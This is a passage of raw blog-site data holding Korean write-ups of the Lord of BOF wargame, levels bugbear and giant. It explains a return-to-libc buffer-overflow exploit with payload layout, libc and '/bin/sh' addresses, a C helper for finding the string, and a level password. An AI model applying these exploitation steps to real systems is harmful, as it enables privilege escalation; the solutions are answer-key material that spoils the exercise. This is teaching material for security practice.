punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| i[4] |\r\n| buffer[40] |\r\n| SFP |\r\n| RET |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>두번째 if문에 argv[1][47] == ‘/xbf’일 시 프로그램을 종료하게 함으로써 스택에 오버플로우 시키는 방법을 사용하지 못하게 하고 있다. 문제에서 RTL을 힌트로 주었으니 이를 활용해 보려 한다.</p>\n<p>앞의 LD_PRELOAD를 이용하는 skeleton 문제에서 라이브러리 관련 설명과 함께 풀이를 한 바 있다. RTL은 Return To Library로, 링킹된 라이브러리의 또다른 함수로 리턴시켜 실행시키는 기법이다. 쉘을 실행시키는 것이 목적인데, 가장 쉬운 방법으로 system(“/bin/sh”)가 있다. argument로 “/bin/sh”를 주고, ret 자리에 system함수의 주소를 준 후, 크기가 4만큼의 패딩을 준 후 해당 함수의 인자로 들어가야 할 “/bin/sh”의 주소를 줄 것이다. 보통 함수의 인자가 ebp+4의 자리에 위치하기 때문이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.848484848484848%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAuklEQVR42nXQwW6FQAgFUKzRCQwDyCg+R+1r4v//44tx0UXTs7ob4AY4v89tex3nERFmWm6ccx6GgTJxYfij6zoAWJYF3j/viCXWmOfZfWqtiUjOGRHdPaWkqohoZsxMdAcRAYDWGtRa3b1Wj3tHTD61ve3HbqZq+siZzCylVB5SoOuu6wKvbjo9p0wNEZGQiPq+h3/81n6tq8e07du8zKJCRKoqUigTEYoqcxnHkZm5FOb7Bd3XPRwRH0XeDojf6sK7AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4d3a4bbdb82d73e112ebde43c6067301/c9b55/0.webp 165w,\n/static/4d3a4bbdb82d73e112ebde43c6067301/f2908/0.webp 330w,\n/static/4d3a4bbdb82d73e112ebde43c6067301/ff4b8/0.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4d3a4bbdb82d73e112ebde43c6067301/04c57/0.png 165w,\n/static/4d3a4bbdb82d73e112ebde43c6067301/d9ecf/0.png 330w,\n/static/4d3a4bbdb82d73e112ebde43c6067301/32056/0.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4d3a4bbdb82d73e112ebde43c6067301/32056/0.png\"\n            alt=\"disas\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>인자로 준 “A” * 44는 buffer의 패딩, “BBBB”는 ret에 넣을 system 함수의 주소 자리, “CCCC”는 인자를 주기 전의 패딩이며 “DDDD”는 “/bin/sh”문자열의 주소 자리이다. system 함수의 주소는 0x40058ae0이므로 argv[1][47]==’/xbf’의 조건문에도 걸리지 않을 것이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 596px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.87878787878788%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAZElEQVR42hXIUQ6DIBBAwUeAALtEi6VGoKi9/yUb53PY98+yrLVWVdWcQwiAtTZJEhURMcYAMaaUnnHOAt57zZnXugCllPt3n9dV6xsIMXznbO3oY3jngDZ668eYQ1WAbSvzPP848wX8bleYegAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/735a569eb06dff739428281772845b18/c9b55/1.webp 165w,\n/static/735a569eb06dff739428281772845b18/f2908/1.webp 330w,\n/static/735a569eb06dff739428281772845b18/3cb93/1.webp 596w\"\n              sizes=\"(max-width: 596px) 100vw, 596px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/735a569eb06dff739428281772845b18/04c57/1.png 165w,\n/static/735a569eb06dff739428281772845b18/d9ecf/1.png 330w,\n/static/735a569eb06dff739428281772845b18/699b7/1.png 596w\"\n            sizes=\"(max-width: 596px) 100vw, 596px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/735a569eb06dff739428281772845b18/699b7/1.png\"\n            alt=\"memory1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>(중략)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 597px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAiElEQVR42iXNURKDIAxF0adBEfWjjgkECGD3v8lO27uAc2HdjmOfpqnUkn8RkXOu1JpLkSgAvPfWTHO+mQGc52nNkipUNWwbABYWicxM80xEEqNIvPkGsCxrTFGEX9cFIISQNH1da+04dgDVqjWrtTrniKj11nrPOQNYvX/ezxhDs/7P43n66B8OGgvB2IRZewAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/eec8b8e0e305bd08cbfd6a6965408f14/c9b55/2.webp 165w,\n/static/eec8b8e0e305bd08cbfd6a6965408f14/f2908/2.webp 330w,\n/static/eec8b8e0e305bd08cbfd6a6965408f14/9e35d/2.webp 597w\"\n              sizes=\"(max-width: 597px) 100vw, 597px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/eec8b8e0e305bd08cbfd6a6965408f14/04c57/2.png 165w,\n/static/eec8b8e0e305bd08cbfd6a6965408f14/d9ecf/2.png 330w,\n/static/eec8b8e0e305bd08cbfd6a6965408f14/17602/2.png 597w\"\n            sizes=\"(max-width: 597px) 100vw, 597px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/eec8b8e0e305bd08cbfd6a6965408f14/17602/2.png\"\n            alt=\"memory2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 214px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.939393939393941%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAjklEQVR42l3N2xKCIBAAUB9kxgULNJVLMiy4C1Yz9f9/12vT+YHTYcZ6Nn1RV232e7DOAQyF+fXkiIWYClOMMWHywXd/EFPY92WZN+uc3ZZ1HUdlpnlbb8ZM2hhttHXOeT9Puu+FEGIAACkBoPu8H6kcVLkwYc6YczmKBPgNJMhwD0wH1Ra85Xa2s45KfQFWEg6qsmTNdQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/73bfb588bdae516145a5fff5b43cfcbf/c9b55/3.webp 165w,\n/static/73bfb588bdae516145a5fff5b43cfcbf/7190f/3.webp 214w\"\n              sizes=\"(max-width: 214px) 100vw, 214px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/73bfb588bdae516145a5fff5b43cfcbf/04c57/3.png 165w,\n/static/73bfb588bdae516145a5fff5b43cfcbf/a48b3/3.png 214w\"\n            sizes=\"(max-width: 214px) 100vw, 214px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/73bfb588bdae516145a5fff5b43cfcbf/a48b3/3.png\"\n            alt=\"memory3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>“/bin/sh” 문자열이 시작하는 지점은 0xbffffc44이다. 이를 바탕으로 공격을 진행하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.727272727272728%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAfElEQVR42l2KyxKDIAwAlZFKQoI8LYkw/v9fdtre3MPuZZcx5zWuXIqqnO+ztaYqqhpTHPOac8QUe++1tVJLyRkRmfk4ggO3lJJFOiB47wHAWguAROSBmNk5Z4xZjXl9scuD3ruI3Pdda3X7TkQhBASEBHTwtm2Pf/37lw8HmQiV3hblAgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/28cef41a223e1b00dd3f0530534e6970/c9b55/4.webp 165w,\n/static/28cef41a223e1b00dd3f0530534e6970/f2908/4.webp 330w,\n/static/28cef41a223e1b00dd3f0530534e6970/ff4b8/4.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/28cef41a223e1b00dd3f0530534e6970/04c57/4.png 165w,\n/static/28cef41a223e1b00dd3f0530534e6970/d9ecf/4.png 330w,\n/static/28cef41a223e1b00dd3f0530534e6970/32056/4.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/28cef41a223e1b00dd3f0530534e6970/32056/4.png\"\n            alt=\"exploit1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>공격에 실패하였으나 경로명이 보이는 것을 보아 “/bin/sh” 문자열이 bugbear의 복사본 파일에서는 0xbffffc44에 위치하였으나, 원본 파일에서 0xbffffc44는 “/bin/sh”의 약간 뒤에 위치하고 있음을 추측해 낼 수 있었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.545454545454545%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAhklEQVR42iXEUQ6DIAwAUGNbqG1t5oCBgPP+t1zi3sdb5jWv67rvb8q5tZpLySWPMVJKY/TeT3evtR7v43W8mFkfROTuy5yz9z7nUFUACCEgYoyRmYkohPCfmREAEQEAidZ1JaKltlo+pbV2nk1VNxFVMVMzY2Z5qKmI8LaZmYi4e4xx3/cfDd0JrbWKLZ4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/43b24253ee4a45805bb449309053ffed/c9b55/5.webp 165w,\n/static/43b24253ee4a45805bb449309053ffed/f2908/5.webp 330w,\n/static/43b24253ee4a45805bb449309053ffed/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/43b24253ee4a45805bb449309053ffed/04c57/5.png 165w,\n/static/43b24253ee4a45805bb449309053ffed/d9ecf/5.png 330w,\n/static/43b24253ee4a45805bb449309053ffed/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/43b24253ee4a45805bb449309053ffed/32056/5.png\"\n            alt=\"exploit2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>“/bin/sh”의 주소지를 0xbffffc3a로 설정하니 공격에 성공하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 124px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40.322580645161295%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABOklEQVR42m2N2W6CUBCGh+Vw9gMIRBE3lNXlxtqogBoNvWjTm/b9H6bRNk1N/ZLJ5P+Tbwb8wKOEMEptx+u4qtvrBZ4LAEqpW00ZZwTj2+acC8E5/FI3u3P70tT7l9e3ffV8ODZdvyNd//3zo2qq6WgwLfL2Uu9P7eWwa86XptrqugZ/0X4GTNPQDeO79HyfEWxh4jo2AFydewvG8SxLk2g8HkZhVhRe4DHhzMscAGZpHo0mge+VRUkJvt7X7u14mmZZEidJmsSzJLEd20BWEPgA4LpefzAMw27UDy1kwn+QiUzTJBgTTHRdQwhLJS2EOOOMUowtIa8RHrJYreqmXj9t6sNOBxhMsu3xVJZpXmTz5WK+XB3adrNeI9N4IHMubKUYpVIKAMCE2o6jlLQsxLlQSkqlBGfao89fPsgf01Rq9bMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1694baa98cfd30178d7e3359af4093c6/4a469/6.webp 124w\"\n              sizes=\"(max-width: 124px) 100vw, 124px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1694baa98cfd30178d7e3359af4093c6/d6e54/6.png 124w\"\n            sizes=\"(max-width: 124px) 100vw, 124px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1694baa98cfd30178d7e3359af4093c6/d6e54/6.png\"\n            alt=\"mypass\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: new divide</p>\n<ul>\n<li>system 함수에 “/bin/sh”이라는 문자열이 이미 포함되어 있다는 것을 알게 되었다.</li>\n</ul>\n<p>문자열을 찾기 위해 아래와 같은 코드를 작성하였다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\r\n<span class=\"token number\">1</span>  #include <span class=\"token operator\">&lt;</span>stdio<span class=\"token punctuation\">.</span>h<span class=\"token operator\">></span>\r\n<span class=\"token number\">2</span>  \r\n<span class=\"token number\">3</span>  <span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n<span class=\"token number\">4</span>          <span class=\"token keyword\">long</span> fsystem <span class=\"token operator\">=</span> <span class=\"token number\">0x400391e0</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token number\">5</span>          <span class=\"token keyword\">long</span> shell <span class=\"token operator\">=</span> fsystem<span class=\"token punctuation\">;</span>\r\n<span class=\"token number\">6</span>  \r\n<span class=\"token number\">7</span>          <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>shell<span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n<span class=\"token number\">8</span>                  shell<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token number\">9</span>          <span class=\"token punctuation\">}</span>\r\n<span class=\"token number\">10</span> \r\n<span class=\"token number\">11</span>         <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh = 0x%x\\n\"</span><span class=\"token punctuation\">,</span> shell<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token number\">12</span> \r\n<span class=\"token number\">13</span>         <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token number\">14</span> <span class=\"token punctuation\">}</span>\r\n</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 511px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.75757575757576%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAiUlEQVR42lXBWxKDIAwAQLDy0EHCKyqSAN7/kp3pX3fFQzTn6J3H7FetTK2UTJ3fd3YmPDGllAsSc2sPANjNevDucNpogSde14Unnj+13sfhQgw555Tivu/OHSFAweKcU0opra21xph1/YhG1Ee/601MxDzm8OABIKYUY9i2TQghl0UuUkop/n0BIbcLuoVcZSgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d1f29dc65442c56750734ff0bf3e3072/c9b55/7.webp 165w,\n/static/d1f29dc65442c56750734ff0bf3e3072/f2908/7.webp 330w,\n/static/d1f29dc65442c56750734ff0bf3e3072/4719d/7.webp 511w\"\n              sizes=\"(max-width: 511px) 100vw, 511px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d1f29dc65442c56750734ff0bf3e3072/04c57/7.png 165w,\n/static/d1f29dc65442c56750734ff0bf3e3072/d9ecf/7.png 330w,\n/static/d1f29dc65442c56750734ff0bf3e3072/92e00/7.png 511w\"\n            sizes=\"(max-width: 511px) 100vw, 511px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d1f29dc65442c56750734ff0bf3e3072/92e00/7.png\"\n            alt=\"ps\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>system함수 내에서 “/bin/sh”이라는 문자열이 있는 주소는 0x400fbff9이다.</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"76ed7f40-9621-5e7f-894d-3235eb4d4188","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-13/","title":"LOB 13번 (darkknight -> bugbear)","readingTime":{"text":"4 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/9397e179524d64df50cd4edd7404cfa4/3bb48/0.png","srcSet":"/static/9397e179524d64df50cd4edd7404cfa4/e4a37/0.png 121w,\n/static/9397e179524d64df50cd4edd7404cfa4/c55bc/0.png 242w,\n/static/9397e179524d64df50cd4edd7404cfa4/3bb48/0.png 483w","sizes":"(min-width: 483px) 483px, 100vw"},"sources":[{"srcSet":"/static/9397e179524d64df50cd4edd7404cfa4/0e0e7/0.webp 121w,\n/static/9397e179524d64df50cd4edd7404cfa4/4c605/0.webp 242w,\n/static/9397e179524d64df50cd4edd7404cfa4/11ab1/0.webp 483w","type":"image/webp","sizes":"(min-width: 483px) 483px, 100vw"}]},"width":660,"height":400.3726708074534}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - giant\r\n        - RTL2\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        FILE <span class=\"token operator\">*</span>fp<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>lib_addr<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>execve_offset<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>execve_addr<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>ret<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// gain address of execve</span>\r\n        fp <span class=\"token operator\">=</span> <span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/usr/bin/ldd /home/giant/assassin | /bin/grep libc | /bin/awk '{print $4}'\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token string\">\"(%x)\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>lib_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        fp <span class=\"token operator\">=</span> <span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%x\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>execve_offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        execve_addr <span class=\"token operator\">=</span> lib_addr <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>execve_offset<span class=\"token punctuation\">;</span>\r\n        <span class=\"token comment\">// end</span>\r\n\r\n        <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>ret<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">44</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ret <span class=\"token operator\">!=</span> execve_addr<span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You must use execve!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| buffer |\r\n| SFP |\r\n| RET |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>우선 길어진 소스코드 분석을 하자. argc가 2보다 작을 시 거르는 조건문과 argv[1]을 buffer로 복사하여 이를 사용하는 부분은 이전과 같다. argv[1]이 어떻게 처리되느냐를 중점적으로 보아야 한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\r\n<span class=\"token number\">24</span>         fp <span class=\"token operator\">=</span> <span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/usr/bin/ldd /home/giant/assassin | /bin/grep libc | /bin/awk '{print $4}'\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n</code></pre></div>\n<p>24번째 줄이다. 명령어 ldd는 인자로 오는 프로그램이나 공유 라이브러리들이 요구하는 공유 라이브러리들을 출력해 준다.\r\n명령어 awk는 패턴 검색 및 처리 언어로, 위처럼 “... | /bin/awk ‘{print $4}’”라고 되어있으면 좌측에서 파이프로 넘어온 출력 중 네번째 필드값(주소값이 해당됨)만 출력한다.\r\n즉 바이너리 파일인 assassin의 공유 라이브러리 중 libc 공유 라이브러리를 찾아 그의 주소값을 fp에 저장한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\r\n<span class=\"token number\">25</span>         <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token number\">26</span>         <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token string\">\"(%x)\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>lib_addr<span class=\"token 